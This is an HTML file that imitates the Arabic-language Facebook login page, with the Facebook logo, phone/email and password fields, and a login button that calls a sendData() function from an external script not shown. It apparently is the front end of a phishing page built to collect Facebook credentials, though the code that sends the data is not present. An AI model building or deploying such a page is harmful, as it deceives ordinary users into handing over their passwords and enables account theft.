<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل الدخول إلى Facebook</title>
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" type="image/png">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    </div>
    <h2>تسجيل الدخول إلى Facebook</h2>
    <input type="text" id="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
    <input type="password" id="password" placeholder="كلمة السر">
    <button onclick="sendData()">تسجيل الدخول</button>
    <a href="#">هل نسيت كلمة السر؟</a>
    <div class="separator"><span>أو</span></div>
    <button class="create-account" onclick="window.location.href='#'">إنشاء حساب جديد</button>
  </div>

  <script src="script.js"></script>
</body>
</html>
